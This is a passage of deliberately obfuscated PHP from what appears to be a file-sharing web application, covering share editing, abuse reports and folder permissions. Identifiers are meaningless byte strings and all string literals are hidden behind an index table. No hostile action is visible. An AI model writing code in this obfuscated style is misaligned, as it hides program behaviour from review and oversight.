($úŞí†ü == 0) { $‹ÒšŞŸ† = array($ëËÆå[2162] => $Ò›¬»©ê[$ëËÆå[1276]], $ëËÆå[1786] => $è‘—Ã½¼); } if ($ÌÅ’ôîŒ = $this->where($‹ÒšŞŸ†)->find()) { return $ÌÅ’ôîŒ[$ëËÆå[672]]; } if ($úŞí†ü == 0) { $•ˆ´«²™ = array($ëËÆå[32] => get_path_this($Ò›¬»©ê[$ëËÆå[87]])); } else { $•ˆ´«²™ = Model($ëËÆå[915])->sourceInfo($úŞí†ü); if (!$•ˆ´«²™) { return !1; } } if (!$Ò›¬»©ê[$ëËÆå[1683]]) { $Ò›¬»©ê[$ëËÆå[1683]] = $•ˆ´«²™[$ëËÆå[32]]; } $è×Ô××Ñ = array($ëËÆå[1786] => $è‘—Ã½¼, $ëËÆå[493] => $úŞí†ü, $ëËÆå[1683] => $ëËÆå[12], $ëËÆå[566] => 0, $ëËÆå[670] => 0, $ëËÆå[1276] => $ëËÆå[12], $ëËÆå[384] => $ëËÆå[12], $ëËÆå[985] => $ëËÆå[12], $ëËÆå[2163] => 0, $ëËÆå[2164] => 0, $ëËÆå[846] => 0, $ëËÆå[2165] => $ëËÆå[12], $ëËÆå[2146] => $ëËÆå[12]); $§ÓÔşØÆ = explode($ëËÆå[50], $ëËÆå[2166]); foreach ($§ÓÔşØÆ as $„ò¸Î‡ì) { if (!isset($Ò›¬»©ê[$„ò¸Î‡ì])) { continue; } $è×Ô××Ñ[$„ò¸Î‡ì] = $Ò›¬»©ê[$„ò¸Î‡ì]; } $˜Ç¦Å = $this->add($è×Ô××Ñ); $”ëŠ‘ùÍ = array($ëËÆå[2146] => short_id($˜Ç¦Å)); $this->where(array($ëËÆå[2167] => $˜Ç¦Å))->save($”ëŠ‘ùÍ); return $˜Ç¦Å; } private function _shareAuthSet($Úş‰…œÉ, $Ş‹åİ›±) { $ˆû¦ø«ì =& $_SERVER[™¸œØ®Ü]; if (!is_array($Ş‹åİ›±)) { return !1; } $ïŞâ‘¿ú = Model($ˆû¦ø«ì[2108]); $ïŞâ‘¿ú->where(array($ˆû¦ø«ì[672] => $Úş‰…œÉ))->delete(); $šª«Ã = array(); foreach ($Ş‹åİ›± as $„¾¥³·¾) { $Ğ˜€İ± = SourceModel::TYPE_USER; if ($„¾¥³·¾[$ˆû¦ø«ì[190]] == SourceModel::TYPE_GROUP) { $Ğ˜€İ± = SourceModel::TYPE_GROUP; } $Ü´ö³è = array($ˆû¦ø«ì[672] => $Úş‰…œÉ, $ˆû¦ø«ì[190] => $Ğ˜€İ±, $ˆû¦ø«ì[573] => intval($„¾¥³·¾[$ˆû¦ø«ì[573]]), $ˆû¦ø«ì[2104] => 0, $ˆû¦ø«ì[2168] => -1); if ($„¾¥³·¾[$ˆû¦ø«ì[2104]]) { $Ü´ö³è[$ˆû¦ø«ì[2104]] = $„¾¥³·¾[$ˆû¦ø«ì[2104]]; } else { if ($„¾¥³·¾[$ˆû¦ø«ì[2168]]) { $Ü´ö³è[$ˆû¦ø«ì[2168]] = $„¾¥³·¾[$ˆû¦ø«ì[2168]]; } } $šª«Ã[] = $Ü´ö³è; } return $ïŞâ‘¿ú->addAll($šª«Ã, array(), !0); } public function numViewAdd($î“ê¼€™) { $—ÇöË•» =& $_SERVER[™¸œØ®Ü]; $è‰Çºò = array($—ÇöË•»[2167] => $î“ê¼€™); $this->where($è‰Çºò)->setAdd($—ÇöË•»[2163]); } public function numDownloadAdd($©ª”Œ®é) { $„’§ø¹ =& $_SERVER[™¸œØ®Ü]; $ÀÀÚ‹½ = array($„’§ø¹[2167] => $©ª”Œ®é); $this->where($ÀÀÚ‹½)->setAdd($„’§ø¹[2164]); } protected function shareEdit($İŠ„‚óé, $ªÁöÔ„È) { $ÅÉŒç§Ò =& $_SERVER[™¸œØ®Ü]; $÷œš€·€ = $this->getInfo($İŠ„‚óé); if (!$÷œš€·€) { return !1; } $this->_checkLinkShare($ªÁöÔ„È, $÷œš€·€); $©ôÎÛşŠ = array(); $Âø¢îèº = explode($ÅÉŒç§Ò[50], $ÅÉŒç§Ò[2169]); foreach ($Âø¢îèº as $ˆ‡¸ÁÆ) { if (!array_key_exists($ˆ‡¸ÁÆ, $ªÁöÔ„È)) { continue; } $©ôÎÛşŠ[$ˆ‡¸ÁÆ] = $ªÁöÔ„È[$ˆ‡¸ÁÆ]; } $this->shareEventAdd($÷œš€·€[$ÅÉŒç§Ò[193]], $ªÁöÔ„È, $ÅÉŒç§Ò[1965]); $this->where(array($ÅÉŒç§Ò[2167] => $İŠ„‚óé))->save($©ôÎÛşŠ); if (isset($ªÁöÔ„È[$ÅÉŒç§Ò[2155]])) { $this->_shareAuthSet($İŠ„‚óé, $ªÁöÔ„È[$ÅÉŒç§Ò[2155]]); } return !0; } private function _checkLinkShare($Û‡€µó, $Â¿Ú¶¯) { $û‘À¢€§ =& $_SERVER[™¸œØ®Ü]; if ($Û‡€µó[$û‘À¢€§[566]] != $û‘À¢€§[91]) { return; } $Ë™Íİé = $Â¿Ú¶¯[$û‘À¢€§[90]][$û‘À¢€§[193]]; if ($Â¿Ú¶¯[$û‘À¢€§[90]][$û‘À¢€§[33]] != $û‘À¢€§[232]) { $’Ÿ©ŠÒŞ = $this->_folderReport($Ë™Íİé); if (!$’Ÿ©ŠÒŞ) { return; } show_json(LNG($û‘À¢€§[2170]) . $û‘À¢€§[2171] . $’Ÿ©ŠÒŞ, !1); } $¢ğ‰†áÄ = Model($û‘À¢€§[915])->fileInfoGet($Â¿Ú¶¯[$û‘À¢€§[90]][$û‘À¢€§[193]]); if (!$¢ğ‰†áÄ) { return; } $ÎìÆ½Ø¢ = $this->shareFileMeta($¢ğ‰†áÄ[$û‘À¢€§[545]]); if (isset($ÎìÆ½Ø¢[$û‘À¢€§[452]]) && $ÎìÆ½Ø¢[$û‘À¢€§[452]] == $û‘À¢€§[91]) { show_json(LNG($û‘À¢€§[2172]), !1); } } private function _folderReport($Ø‹ú›Û) { $ƒó­Œä =& $_SERVER[™¸œØ®Ü]; $ò¤¸¬Éè = array($ƒó­Œä[545] => array($ƒó­Œä[1108], 0), $ƒó­Œä[835] => 3); $½êæ¹ = Model($ƒó­Œä[2173])->where($ò¤¸¬Éè)->field($ƒó­Œä[545])->select(); if (!$½êæ¹) { return !1; } $½êæ¹ = array_to_keyvalue($½êæ¹, $ƒó­Œä[12], $ƒó­Œä[545]); $ÎÀ‚¢Ò‚ = $ƒó­Œä[50] . $Ø‹ú›Û . $ƒó­Œä[50]; $ò¤¸¬Éè = array($ƒó­Œä[545] => array($ƒó­Œä[7], $½êæ¹), $ƒó­Œä[588] => array($ƒó­Œä[461], "\x25{$ÎÀ‚¢Ò‚}\45"), $ƒó­Œä[507] => 0); $êÒåè´ = Model($ƒó­Œä[915])->where($ò¤¸¬Éè)->field($ƒó­Œä[2174])->find(); if (!$êÒåè´) { return !1; } $Ş§¢ƒÔˆ = substr($êÒåè´[$ƒó­Œä[588]], strpos($êÒåè´[$ƒó­Œä[588]], $ÎÀ‚¢Ò‚)); $ò¤¸¬Éè = array($ƒó­Œä[193] => array($ƒó­Œä[7], trim($Ş§¢ƒÔˆ, $ƒó­Œä[50]))); $´À§Î¡ = Model($ƒó­Œä[915])->where($ò¤¸¬Éè)->field($ƒó­Œä[32])->select(); $™ˆªÈ½Æ = array_to_keyvalue($´À§Î¡, $ƒó­Œä[12], $ƒó­Œä[32]); $™ˆªÈ½Æ[] = $êÒåè´[$ƒó­Œä[32]]; return implode($ƒó­Œä[8], $™ˆªÈ½Æ); } protected function remove($ò¥¬Ñ¿¾) { $¶µıÙßÊ =& $_SERVER[™¸œØ®Ü]; $ÚÖ¡×…¸ = is_array($ò¥¬Ñ¿¾) ? $ò¥¬Ñ¿¾ : array($ò¥¬Ñ¿¾); for ($½àİ¨Ã¬ = 0; $½àİ¨Ã¬ < count($ÚÖ¡×…¸); $½àİ¨Ã¬++) { $õ„äß•Ï = $this->getInfo($ÚÖ¡×…¸[$½àİ¨Ã¬]); if ($õ„äß•Ï[$¶µıÙßÊ[670]] == $¶µıÙßÊ[91]) { Model($¶µıÙßÊ[640])->eventShare($õ„äß•Ï[$¶µıÙßÊ[193]], $¶µıÙßÊ[2161]); } if ($õ„äß•Ï[$¶µıÙßÊ[566]] == $¶µıÙßÊ[91]) { Model($¶µıÙßÊ[640])->eventShare($õ„äß•Ï[$¶µıÙßÊ[193]], $¶µıÙßÊ[2160]); } $this->shareInfoMofify($õ„äß•Ï, $¶µıÙßÊ[2145]); } $É“›¦Ö® = array($¶µıÙßÊ[672] => array($¶µıÙßÊ[7], $ÚÖ¡×…¸)); $åâ €­’ = $this->where($É“›¦Ö®)->delete(); if ($åâ €­’) { Model($¶µıÙßÊ[673])->where($É“›¦Ö®)->delete(); } return $åâ €­’; } protected function removeBySource($ÖŸÖ„¼È) { $ùÛ³šÑÎ =& $_SERVER[™¸œØ®Ü]; $œì‰‘™Á = array($ùÛ³šÑÎ[493] => array($ùÛ³šÑÎ[494], $ÖŸÖ„¼È)); $ùöĞâıÎ = $this->field($ùÛ³šÑÎ[672])->where($œì‰‘™Á)->select(); $°£–û²¿ = array_to_keyvalue($ùöĞâıÎ, $ùÛ³šÑÎ[12], $ùÛ³šÑÎ[672]); if (!$°£–û²¿) { return; } foreach ($ùöĞâıÎ as $éË¿¾£Ù) { $this->shareInfoMofify($éË¿¾£Ù, $ùÛ³šÑÎ[2145]); } $œì‰‘™Á = array($ùÛ³šÑÎ[2167] => array($ùÛ³šÑÎ[494], $°£–û²¿)); $this->where($œì‰‘™Á)->delete(); Model($ùÛ³šÑÎ[673])->where($œì‰‘™Á)->delete(); } public function listAll($½€—›¯) { $Øº½ö¤­ =& $_SERVER[™¸œØ®Ü]; $¿«€ÅÆ€ = array(); if ($½€—›¯[$Øº½ö¤­[1795]]) { $¿«€ÅÆ€[$Øº½ö¤­[1795]] = $½€—›¯[$Øº½ö¤­[1795]]; } if ($½€—›¯[$Øº½ö¤­[845]]) { $’¼„•ëü = $½€—›¯[$Øº½ö¤­[846]] ? $½€—›¯[$Øº½ö¤­[846]] : strtotime(date($Øº½ö¤­[2175])); $¿«€ÅÆ€[$Øº½ö¤­[233]] = array($Øº½ö¤­[410], array($½€—›¯[$Øº½ö¤­[845]], $’¼„•ëü)); } if ($½€—›¯[$Øº½ö¤­[33]]) { $¿«€ÅÆ€[$½€—›¯[$Øº½ö¤­[33]]] = 1; } else { $¿«€ÅÆ€[] = array($Øº½ö¤­[566] => array($Øº½ö¤­[1108], 0), $Øº½ö¤­[670] => array($Øº½ö¤­[1108], 0), $Øº½ö¤­[2149] => $Øº½ö¤­[2098]); } if ($½€—›¯[$Øº½ö¤­[2094]]) { $¿«€ÅÆ€[] = array($Øº½ö¤­[2146] => $½€—›¯[$Øº½ö¤­[2094]], $Øº½ö¤­[1683] => array($Øº½ö¤­[461], "\45{$½€—›¯[$Øº½ö¤­[2094]]}\45"), $Øº½ö¤­[2149] => $Øº½ö¤­[2098]); } $—Õ¸™° = $this->_makeOrder()->where($¿«€ÅÆ€)->selectPage(20); if (empty($—Õ¸™°[$Øº½ö¤­[447]])) { return array(); } $this->_listDataApply($—Õ¸™°[$Øº½ö¤­[447]]); return $—Õ¸™°; } public function listDataApply($°Õ£³œ€) { $this->_listDataApply($°Õ£³œ€); return $°Õ£³œ€; } private function _listDataApply(&$ÔĞ¸©Ñ) { $ôÔäîÄ¥ =& $_SERVER[™¸œØ®Ü]; $„ê¦ş„Ş = array_to_keyvalue($ÔĞ¸©Ñ, $ôÔäîÄ¥[12], $ôÔäîÄ¥[1795]); $£Â‡Å° = Model($ôÔäîÄ¥[601])->userListInfo(array_unique($„ê¦ş„Ş)); $Æ¦œÂ®´ = array_to_keyvalue($ÔĞ¸©Ñ, $ôÔäîÄ¥[12], $ôÔäîÄ¥[193]); $ĞÛºË­ = Model($ôÔäîÄ¥[915])->sourceListInfo($Æ¦œÂ®´, !0); foreach ($ÔĞ¸©Ñ as $£‹•®Üö => &$»Ôº€Œ­) { $ÒŞ‡“ = $»Ôº€Œ­[$ôÔäîÄ¥[1795]]; $»Ôº€Œ­[$ôÔäîÄ¥[2176]] = $£Â‡Å°[$ÒŞ‡“] ? $£Â‡Å°[$ÒŞ‡“] : !1; if (!$»Ôº€Œ­[$ôÔäîÄ¥[2176]] || $»Ôº€Œ­[$ôÔäîÄ¥[2176]][$ôÔäîÄ¥[835]] != $ôÔäîÄ¥[91]) { unset($ÔĞ¸©Ñ[$£‹•®Üö]); continue; } $ñïÄĞÏĞ = $»Ôº€Œ­[$ôÔäîÄ¥[193]]; $»Ôº€Œ­[$ôÔäîÄ¥[90]] = $ĞÛºË­[$ñïÄĞÏĞ] ? $ĞÛºË­[$ñïÄĞÏĞ] : !1; if ($»Ôº€Œ­[$ôÔäîÄ¥[90]][$ôÔäîÄ¥[507]] == $ôÔäîÄ¥[91]) { unset($ÔĞ¸©Ñ[$£‹•®Üö]); } if ($»Ôº€Œ­[$ôÔäîÄ¥[90]] != $ôÔäîÄ¥[230] && !$»Ôº€Œ­[$ôÔäîÄ¥[90]]) { unset($ÔĞ¸©Ñ[$£‹•®Üö]); } } unset($»Ôº€Œ­); $ÔĞ¸©Ñ = array_values($ÔĞ¸©Ñ); } private function _makeOrder($û‘õÊÈƒ = '') { $İü•ú£’ =& $_SERVER[™¸œØ®Ü]; $ßåğø = array($İü•ú£’[233], $İü•ú£’[846], $İü•ú£’[2163], $İü•ú£’[2164]); $ß–™ú¶… = array($İü•ú£’[525] => $İü•ú£’[526], $İü•ú£’[527] => $İü•ú£’[528]); $©¿É¡¸ = Input::get($İü•ú£’[532], $İü•ú£’[7], $İü•ú£’[499], $ßåğø); $øÉ¦Ò±ï = Input::get($İü•ú£’[533], $İü•ú£’[7], $İü•ú£’[2177], array($İü•ú£’[2091], $İü•ú£’[527])); $øÉ¦Ò±ï = $ß–™ú¶…[$øÉ¦Ò±ï]; $û‘õÊÈƒ = $û‘õÊÈƒ . "{$©¿É¡¸}\x20{$øÉ¦Ò±ï}"; return $this->order($û‘õÊÈƒ); } public function reportAdd($‘‚ –Š) { $¢óÆùù =& $_SERVER[™¸œØ®Ü]; $íõ²ß‡ = array($¢óÆùù[672] => $‘‚ –Š[$¢óÆùù[672]], $¢óÆùù[1795] => USER_ID); if (Model($¢óÆùù[2173])->where($íõ²ß‡)->find()) { return !1; } $…Œ‰¦÷ä = array($¢óÆùù[672] => $‘‚ –Š[$¢óÆùù[672]], $¢óÆùù[1683] => $‘‚ –Š[$¢óÆùù[1683]], $¢óÆùù[193] => $‘‚ –Š[$¢óÆùù[193]], $¢óÆùù[545] => $‘‚ –Š[$¢óÆùù[545]], $¢óÆùù[1795] => USER_ID, $¢óÆùù[33] => $‘‚ –Š[$¢óÆùù[33]], $¢óÆùù[528] => $‘‚ –Š[$¢óÆùù[528]]); return Model($¢óÆùù[2173])->add($…Œ‰¦÷ä); } public function reportList($Á—æô€Ò) { $”ÆûìÎ =& $_SERVER[™¸œØ®Ü]; $©é¸£ = array(); if ($Á—æô€Ò[$”ÆûìÎ[845]]) { $ü¬é¬•£ = $Á—æô€Ò[$”ÆûìÎ[846]] ? $Á—æô€Ò[$”ÆûìÎ[846]] : strtotime(date($”ÆûìÎ[2175])); $©é¸£[$”ÆûìÎ[233]] = array($”ÆûìÎ[410], array($Á—æô€Ò[$”ÆûìÎ[845]], $ü¬é¬•£)); } if (isset($Á—æô€Ò[$”ÆûìÎ[33]]) && in_array($Á—æô€Ò[$”ÆûìÎ[33]], array($”ÆûìÎ[91], $”ÆûìÎ[512], $”ÆûìÎ[2178], $”ÆûìÎ[2179], $”ÆûìÎ[2180]))) { $©é¸£[$”ÆûìÎ[33]] = $Á—æô€Ò[$”ÆûìÎ[33]]; } if (isset($Á—æô€Ò[$”ÆûìÎ[835]]) && in_array($Á—æô€Ò[$”ÆûìÎ[835]], array($”ÆûìÎ[230], $”ÆûìÎ[91], $”ÆûìÎ[512], $”ÆûìÎ[2178]))) { $©é¸£[$”ÆûìÎ[835]] = $Á—æô€Ò[$”ÆûìÎ[835]]; } $ã­°£• = Input::get($”ÆûìÎ[533], $”ÆûìÎ[7], $”ÆûìÎ[2177], array($”ÆûìÎ[2091], $”ÆûìÎ[527])); $øß¶«£ = array($”ÆûìÎ[525] => $”ÆûìÎ[526], $”ÆûìÎ[527] => $”ÆûìÎ[528]); $‰‘¹Ãˆì = $”ÆûìÎ[2181] . $øß¶«£[$ã­°£•]; $…ò×›ˆ = Model($”ÆûìÎ[2173])->where($©é¸£)->order($‰‘¹Ãˆì)->selectPage(20); if (empty($…ò×›ˆ[$”ÆûìÎ[447]])) { return array(); } $ÆÁĞëš‡ = array_to_keyvalue_group($…ò×›ˆ[$”ÆûìÎ[447]], $”ÆûìÎ[835], $”ÆûìÎ[672]); if (!empty($ÆÁĞëš‡[0])) { $Á—æô€Ò = $ÆÁĞëš‡[0]; $©é¸£ = array($”ÆûìÎ[672] => array($”ÆûìÎ[7], $Á—æô€Ò)); $´‡‘ìÌ‚ = $this->where($©é¸£)->field($”ÆûìÎ[672])->select(); $´‡‘ìÌ‚ = array_to_keyvalue($´‡‘ìÌ‚, $”ÆûìÎ[12], $”ÆûìÎ[672]); $‹Í³ı½¢ = array_diff($Á—æô€Ò, $´‡‘ìÌ‚); if (!empty($‹Í³ı½¢)) { foreach ($…ò×›ˆ[$”ÆûìÎ[447]] as $¬›î»º => $èî‹ƒ¢°) { if (in_array($èî‹ƒ¢°[$”ÆûìÎ[672]], $‹Í³ı½¢)) { unset($…ò×›ˆ[$”ÆûìÎ[447]][$¬›î»º]); } } } } $this->_listDataApply($…ò×›ˆ[$”ÆûìÎ[447]]); return $…ò×›ˆ; } public function reportStatus($‰»ŞĞ•¿) { $¨«€Üˆ‘ =& $_SERVER[™¸œØ®Ü]; $Ô¿„ëê§ = array($¨«€Üˆ‘[477] => $‰»ŞĞ•¿[$¨«€Üˆ‘[477]]); $şóå‹ÚÓ = Model($¨«€Üˆ‘[2173])->where($Ô¿„ëê§)->field($¨«€Üˆ‘[2182])->find(); if (!$şóå‹ÚÓ) { return !1; } $ÙñÚÂ  = array($¨«€Üˆ‘[835] => $‰»ŞĞ•¿[$¨«€Üˆ‘[835]]); if ($‰»ŞĞ•¿[$¨«€Üˆ‘[835]] == $¨«€Üˆ‘[2178] && $şóå‹ÚÓ[$¨«€Üˆ‘[835]] == $¨«€Üˆ‘[2178]) { $ÙñÚÂ [$¨«€Üˆ‘[835]] = 0; } $ÚÌü†ê¤ = Model($¨«€Üˆ‘[2173])->where($Ô¿„ëê§)->save($ÙñÚÂ ); if ($‰»ŞĞ•¿[$¨«€Üˆ‘[835]] == $¨«€Üˆ‘[512]) { if ($şóå‹ÚÓ[$¨«€Üˆ‘[545]] != $¨«€Üˆ‘[230] && $this->shareFileMeta($şóå‹ÚÓ[$¨«€Üˆ‘[545]])) { $this->shareFileMeta($şóå‹ÚÓ[$¨«€Üˆ‘[545]], 0); } $this->remove($şóå‹ÚÓ[$¨«€Üˆ‘[672]]); return !0; } if ($ÚÌü†ê¤ && $‰»ŞĞ•¿[$¨«€Üˆ‘[835]] == $¨«€Üˆ‘[2178]) { $º…¡Ğ±ú = $ÙñÚÂ [$¨«€Üˆ‘[835]] == $¨«€Üˆ‘[2178] ? 1 : 0; $this->shareFileMeta($şóå‹ÚÓ[$¨«€Üˆ‘[545]], $º…¡Ğ±ú); $this->removeByFile($şóå‹ÚÓ[$¨«€Üˆ‘[545]]); } return $ÚÌü†ê¤; } private function removeByFile($‡â¸¹­Û) { $ûğÕ•ÃÍ =& $_SERVER[™¸œØ®Ü]; $³šú‘Ì“ = Model($ûğÕ•ÃÍ[915])->where(array($ûğÕ•ÃÍ[545] => $‡â¸¹­Û))->field($ûğÕ•ÃÍ[193])->select(); $ã—ûı±Ç = array_to_keyvalue($³šú‘Ì“, $ûğÕ•ÃÍ[12], $ûğÕ•ÃÍ[193]); $â®Ø„» = array($ûğÕ•ÃÍ[193] => array($ûğÕ•ÃÍ[7], $ã—ûı±Ç), $ûğÕ•ÃÍ[566] => 1); $³šú‘Ì“ = $this->where($â®Ø„»)->field($ûğÕ•ÃÍ[672])->select(); if (empty($³šú‘Ì“)) { return; } $ÅÖì±½ = array_to_keyvalue($³šú‘Ì“, $ûğÕ•ÃÍ[12], $ûğÕ•ÃÍ[672]); $this->remove($ÅÖì±½); } private function shareFileMeta($¹¤ÒŞëæ, $šÅú×¬æ = null) { $ù·Ï¿æ =& $_SERVER[™¸œØ®Ü]; $Å•¥³¢â = array($ù·Ï¿æ[545] => $¹¤ÒŞëæ, $ù·Ï¿æ[97] => $ù·Ï¿æ[2183]); if (is_null($šÅú×¬æ)) { return Model($ù·Ï¿æ[2184])->where($Å•¥³¢â)->find(); } $Å•¥³¢â[$ù·Ï¿æ[452]] = $šÅú×¬æ; Model($ù·Ï¿æ[2184])->add($Å•¥³¢â, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\163\157\x75\x72\143\x65\137\141\165\x74\150"; public function getAuth($ğÎ»‘´„) { $Ğæ¯²×œ =& $_SERVER[™¸œØ®Ü]; $š‹ëçÎË = $this->sourceAuthSelect($ğÎ»‘´„); $½ ÷¸÷ = array(); $«êò·„€ = array(); $¿€é¨’Š = 2 << 25; foreach ($š‹ëçÎË as $Ğ¿šğ…Ç) { $ÕÙıµ¶ø = Model($Ğæ¯²×œ[575])->listData($Ğ¿šğ…Ç[$Ğæ¯²×œ[2104]]); if (!$ÕÙıµ¶ø) { continue; } $½ ÷¸÷[] = $Ğ¿šğ…Ç; $§ÈÊ´ = 0; if ($Ğ¿šğ…Ç[$Ğæ¯²×œ[190]] == SourceModel::TYPE_GROUP) { $§ÈÊ´ = $¿€é¨’Š * 2; } if ($Ğ¿šğ…Ç[$Ğæ¯²×œ[190]] == SourceModel::TYPE_USER) { $§ÈÊ´ = $¿€é¨’Š; } if ($Ğ¿šğ…Ç[$Ğæ¯²×œ[190]] == SourceModel::TYPE_USER && $Ğ¿šğ…Ç[$Ğæ¯²×œ[573]] == $Ğæ¯²×œ[230]) { $§ÈÊ´ = 0; } $«êò·„€[] = $ÕÙıµ¶ø[$Ğæ¯²×œ[489]] + $§ÈÊ´; } array_multisort($«êò·„€, SORT_DESC, $½ ÷¸÷); return $½ ÷¸÷; } public function sourceAuthSelect($Ş‰à½) { $–•ÄœšË =& $_SERVER[™¸œØ®Ü]; static $í¤ù­ = array(); $òÔ¼ÆíØ = is_array($Ş‰à½) ? !1 : !0; if ($òÔ¼ÆíØ) { $Ş‰à½ = array($Ş‰à½); } $†ÚÖò¿¯ = array(); foreach ($Ş‰à½ as $éŠÏØ€) { if (isset($í¤ù­[$éŠÏØ€])) { $†ÚÖò¿¯[$éŠÏØ€] = $í¤ù­[$éŠÏØ€]; } } if (count($†ÚÖò¿¯) == count($Ş‰à½)) { return $òÔ¼ÆíØ ? $†ÚÖò¿¯[$Ş‰à½[0]] : $†ÚÖò¿¯; } $†‡¹ÛÓ = $–•ÄœšË[2185]; $éí¬ĞîŠ = array($–•ÄœšË[193] => array($–•ÄœšË[7], $Ş‰à½)); $à¬åº®¥ = $this->field($†‡¹ÛÓ)->order($–•ÄœšË[477])->where($éí¬ĞîŠ)->select(); $ ˆÔ¹ = array_to_keyvalue_group($à¬åº®¥, $–•ÄœšË[193]); foreach ($Ş‰à½ as $éŠÏØ€) { $í¤ù­[$éŠÏØ€] = $ ˆÔ¹[$éŠÏØ€] ? $ ˆÔ¹[$éŠÏØ€] : array(); } if ($òÔ¼ÆíØ) { return $à¬åº®¥; } return $ ˆÔ¹; } public function setAuth($µÛÚ©¨, $»ËÙşÑÆ) { $š°Á¤Óë =& $_SERVER[™¸œØ®Ü]; $¤ƒ½Ü³ = Model($š°Á¤Óë[1440])->sourceInfo($µÛÚ©¨); if (!$¤ƒ½Ü³) { return !1; } if ($¤ƒ½Ü³[$š°Á¤Óë[190]] != SourceModel::TYPE_GROUP) { return !1; } $˜Ïñš‚ı = 1; $‚Ø¼Ç = $¤ƒ½Ü³[$š°Á¤Óë[573]]; if ($‚Ø¼Ç != $˜Ïñš‚ı) { $šïïï†¡ = array($š°Á¤Óë[1996] => $‚Ø¼Ç); $›Ó±‡’Ó = Model($š°Á¤Óë[2090])->field($š°Á¤Óë[1795])->where($šïïï†¡)->select(); $›Ó±‡’Ó = array_to_keyvalue($›Ó±‡’Ó, $š°Á¤Óë[12], $š°Á¤Óë[1795]); } $±œ¬ÇŞÉ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $éøÕÙˆ© = array(); foreach ($»ËÙşÑÆ as $ĞõÂÚ­ª) { if (!in_array($ĞõÂÚ­ª[$š°Á¤Óë[190]], $±œ¬ÇŞÉ)) { show_json(LNG($š°Á¤Óë[2186]), !1); } if ($‚Ø¼Ç != $˜Ïñš‚ı) { if ($ĞõÂÚ­ª[$š°Á¤Óë[190]] == SourceModel::TYPE_GROUP) { } if ($ĞõÂÚ­ª[$š°Á¤Óë[573]] != 0 && !in_array($ĞõÂÚ­ª[$š°Á¤Óë[573]], $›Ó±‡’Ó)) { } } if ($ĞõÂÚ­ª[$š°Á¤Óë[573]] == 0) { $ĞõÂÚ­ª[$š°Á¤Óë[190]] = SourceModel::TYPE_USER; } $éøÕÙˆ©[] = array($š°Á¤Óë[193] => $µÛÚ©¨, $š°Á¤Óë[190] => intval($ĞõÂÚ­ª[$š°Á¤Óë[190]]), $š°Á¤Óë[573] => intval($ĞõÂÚ­ª[$š°Á¤Óë[573]]), $š°Á¤Óë[2104] => intval($ĞõÂÚ­ª[$š°Á¤Óë[2104]]) ? intval($ĞõÂÚ­ª[$š°Á¤Óë[2104]]) : 0, $š°Á¤Óë[2168] => intval($ĞõÂÚ­ª[$š°Á¤Óë[2168]]) ? intval($ĞõÂÚ­ª[$š°Á¤Óë[2168]]) : -1); } $this->where(array($š°Á¤Óë[493] => $µÛÚ©¨))->delete(); $this->addAll($éøÕÙˆ©); return !0; } public function authClear($…­³—şå) { $æå¶ßø– =& $_SERVER[™¸œØ®Ü]; $ùÊçÛà = Model($æå¶ßø–[1440])->sourceInfo($…­³—şå); $ïÍÀ±÷ = array($…­³—şå); if ($ùÊçÛà[$æå¶ßø–[487]] == $æå¶ßø–[91]) { $«Ÿ©Á‰ = array($æå¶ßø–[659] => array($æå¶ßø–[619], $ùÊçÛà[$æå¶ßø–[588]] . $…­³—şå . $æå¶ßø–[620])); $ïÍÀ±÷ = Model($æå¶ßø–[1440])->field($æå¶ßø–[493])->where($«Ÿ©Á‰)->getField($æå¶ßø–[193], !0); $ïÍÀ±÷[] = $…­³—şå; } $this->where(array($æå¶ßø–[493] => array($æå¶ßø–[494], $ïÍÀ±÷)))->delete(); return !0; } public function getAllChildren($®’à½ì) { $²Ë²Ãçß =& $_SERVER[™¸œØ®Ü]; $„Íœ´Ë… = Model($²Ë²Ãçß[1440])->sourceInfo($®’à½ì); if ($„Íœ´Ë…[$²Ë²Ãçß[487]] != $²Ë²Ãçß[91]) { return $this->sourceListAuth(array($®’à½ì)); } if ($„Íœ´Ë…[$²Ë²Ãçß[190]] != SourceModel::TYPE_GROUP) { return array(); } $ë©˜ä©´ = 1; $°‚ğ”±É = array($®’à½ì); if ($„Íœ´Ë…[$²Ë²Ãçß[192]] == $²Ë²Ãçß[230] && $„Íœ´Ë…[$²Ë²Ãçß[573]] != $ë©˜ä©´) { $°‚ğ”±É = $this->groupChidldAllRootSource($„Íœ´Ë…[$²Ë²Ãçß[573]]); } $Ë›Ä¤ÃÆ = $this->field($²Ë²Ãçß[193])->group($²Ë²Ãçß[193])->select(); $Ë›Ä¤ÃÆ = array_to_keyvalue($Ë›Ä¤ÃÆ, $²Ë²Ãçß[12], $²Ë²Ãçß[193]); if (!$Ë›Ä¤ÃÆ) { return array(); } $ıì´ô·ˆ = $²Ë²Ãçß[2187]; $¥öë±Ñ = array($²Ë²Ãçß[193] => array($²Ë²Ãçß[7], $Ë›Ä¤ÃÆ), $²Ë²Ãçß[507] => $²Ë²Ãçß[230]); $ıµú¶Ç… = Model($²Ë²Ãçß[915])->field($ıì´ô·ˆ)->where($¥öë±Ñ)->select(); $ß„é†ÌÅ = array($®’à½ì); foreach ($ıµú¶Ç… as $ä‘…¡ã) { foreach ($°‚ğ”±É as $š¶å‹¬) { $¡Î³ßò = $²Ë²Ãçß[50] . $š¶å‹¬ . $²Ë²Ãçß[50]; $¡™¡©ÀŠ = $ä‘…¡ã[$²Ë²Ãçß[588]] . $ä‘…¡ã[$²Ë²Ãçß[193]] . $²Ë²Ãçß[50]; if (strstr($¡™¡©ÀŠ, $¡Î³ßò)) { $ß„é†ÌÅ[] = $ä‘…¡ã[$²Ë²Ãçß[193]]; break; } } } return $this->sourceListAuth($ß„é†ÌÅ); } private function sourceListAuth($±µ‘ò›õ) { $„íó‘…ó =& $_SERVER[™¸œØ®Ü]; $ÂÍ‹õ“Ê = Model($„íó‘…ó[1440])->sourceListInfo($±µ‘ò›õ, !0); $¯¶ü°¸ê = $this->sourceAuthSelect($±µ‘ò›õ); $ÎÖÌğË = array(); $Ì®¨Şšì = array(); foreach ($ÂÍ‹õ“Ê as $çí„ƒºƒ) { unset($çí„ƒºƒ[$„íó‘…ó[531]]); unset($çí„ƒºƒ[$„íó‘…ó[529]]); unset($çí„ƒºƒ[$„íó‘…ó[489]]); unset($çí„ƒºƒ[$„íó‘…ó[90]]); $ÒÊ³ËŸ¿ = $¯¶ü°¸ê[$çí„ƒºƒ[$„íó‘…ó[193]]]; if (!$ÒÊ³ËŸ¿) { continue; } $çí„ƒºƒ[$„íó‘…ó[2188]] = 